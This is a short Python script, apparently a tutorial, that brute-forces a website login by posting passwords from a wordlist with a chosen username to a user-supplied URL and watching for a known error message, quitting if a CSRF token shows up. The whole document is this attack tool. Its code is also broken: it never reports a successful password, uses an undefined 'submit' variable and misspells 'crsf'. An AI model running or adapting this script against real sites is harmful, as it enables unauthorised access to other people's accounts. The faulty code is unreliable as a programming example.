# import requests. because Requests allows you to send HTTP/1.1 requests extremely easily.
import requests

"""
     input of the target URL and target username. Also, we need the error message of every wrong try.
"""
url = input("Enter url: ")
username = input("Enter target username: ")
error = input("Enter wrong password for error message")


def brute_force(user_name, url, error):
    #  for loop to get passwords from our given password list.
    for password in passwords:
        # To remove white space, we used strip() function
        password = password.strip()
        # print that password we are trying against that website
        print("trying password" + password)
        # we create a dictionary for sending requests
        data_dictionary = {"username": username,
                           "password": password,
                           "login": submit}

        # send your dictionary with request post method
        response = requests.post(url, data=data_dictionary)
        # Now if we will find that error message is in response.content.
        # We will simply pass it and try the next password because it's not our password
        if error in str(response.content):
            pass
        # The token needs to be unique per user session and should be of large random value to
        # make it difficult to guess.
        # A CSRF secure application assigns a unique CSRF token for every user session.
        elif "crsf" in str(response.content):
            print("CRSF token detected! Bruteforce not working here!")
            exit()


with open("passwords.txt", "r") as passwords:
    brute_force(username, url, error)
    print("[!!] password not found in password list")
